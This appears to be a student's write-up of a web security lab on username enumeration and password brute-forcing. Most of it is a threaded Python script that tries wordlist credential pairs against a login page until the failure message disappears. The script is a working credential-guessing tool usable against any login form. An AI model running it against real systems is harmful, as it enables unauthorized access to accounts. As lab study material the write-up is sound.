[how to protect the login page from brute force](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)

this lab is subtly vulnerable to username enumeration and password brute-force attacks . it has account with a predictable username and password , which can be found in the following wordlist

if we try to enter invalid user name and password we have specaile string 
**`Invalid username or password`**

![[/images/Screenshot from 2026-03-01 15-20-16.png]]

so we base on this string to solve the lab , this is python script using thread to brute force the login page 

```python
from concurrent.futures import ThreadPoolExecutor

import requests as req

import argparse

import threading

import time

  

parser = argparse.ArgumentParser(description="Brute force login")

  

parser.add_argument("url", help="Login URL")

parser.add_argument("-p", "--passwords", required=True, help="Password list")

parser.add_argument("-u", "--users", required=True, help="User list")

  

args = parser.parse_args()

  

url = args.url

filePassword = args.passwords

fileUser = args.users

  

cookies = {

"session": "BV3Zj1k15mY4JN1Jf5bjzO41AAlqj53g"

}

  

print(f"[+] Target: {url}")

  

stop_event = threading.Event()

  

def login_user(data):

if stop_event.is_set():

return

  

response = req.post(url, cookies=cookies, data=data)

print(f"Trying {data['username']}:{data['password']} -> {response.status_code}")

  

if "Invalid username or password" not in response.text:

print(f"[SUCCESS] {data['username']}:{data['password']}")

stop_event.set()

  

tasks = []

  

with open(fileUser) as users, open(filePassword) as passwords:

usernames = [u.strip() for u in users]

pwds = [p.strip() for p in passwords]

  

for u in usernames:

for p in pwds:

tasks.append({"username": u, "password": p})

  

with ThreadPoolExecutor(max_workers=20) as executor:

executor.map(login_user, tasks)
```


